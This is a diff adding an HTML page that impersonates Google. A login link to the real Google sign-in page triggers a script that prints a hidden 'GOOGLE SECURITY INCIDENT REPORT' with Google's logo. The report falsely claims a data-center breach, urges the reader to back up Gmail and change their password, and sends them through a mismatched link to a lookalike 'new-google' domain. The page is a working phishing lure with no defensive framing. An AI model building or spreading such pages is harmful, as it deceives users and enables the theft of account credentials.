@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+/* Hide everything except #printArea when printing */
+@media print {
+  body * {
+    display: none !important;
+  }
+
+  /* IMPORTANT: show #printArea AND its children */
+  #printArea,
+  #printArea * {
+    display: block !important;
+  }
+}
+
+/* Remove browser header/footer (Chrome & Edge) */
+@page {
+  margin: 0;
+}
+</style>
+</head>
+
+<body>
+
+<!-- Clickable link -->
+<a id="printLink" href="https://accounts.google.com" target="_blank" style="font-size:20px;">
+  Login to your google account
+</a>
+
+<!-- PRINT AREA (hidden normally) -->
+<div id="printArea" style="display:none; padding:40px; font-family:Arial, sans-serif; line-height:1.5;">
+
+  <h2 style="text-align:center; margin:0; font-size:28px;">
+    GOOGLE SECURITY INCIDENT REPORT
+  </h2>
+
+  <div style="text-align:center; margin-top:5px; font-size:18px;">
+    22 November 2025
+  </div>
+
+  <!-- Centered Google Logo -->
+  <div style="text-align:center; margin:25px 0;">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
+         alt="Google Logo"
+         style="width:160px;">
+  </div>
+
+  <h3 style="text-align:center; color:red; margin:0; font-size:22px;">
+    URGENT PLEASE READ
+  </h3>
+
+  <p style="margin-top:25px; font-size:16px;">
+    Our data center recently experienced a security breach, and we are reaching out to you as part
+    of our precautionary communication process. While the investigation is still ongoing, we
+    believe it is important to notify you immediately so that you can take the necessary steps to
+    protect your account.
+  </p>
+
+  <p style="font-size:16px;">
+    At this time, we strongly advise you to back up your Gmail account data and change your
+    account password as soon as possible. Taking these actions will help safeguard your
+    information and ensure that your account remains secure while we continue to assess the
+    extent of the incident.
+  </p>
+
+  <p style="font-size:16px;">
+    Your security is our highest priority, and we are working diligently to restore full system
+    integrity. We appreciate your prompt attention to this matter. Please perform the
+    recommended steps here:
+  </p>
+
+  <div style="text-align:center; margin-top:15px; font-size:18px;">
+    <a href="https://new-google.com">https://s.id/new-google</a>
+  </div>
+
+</div>
+
+
+<script>
+document.getElementById("printLink").addEventListener("click", function () {
+    // Delay 3 seconds before printing
+    setTimeout(() => {
+        window.print();
+    }, 2000);
+});
+</script>
+
+</body>
+</html>
+
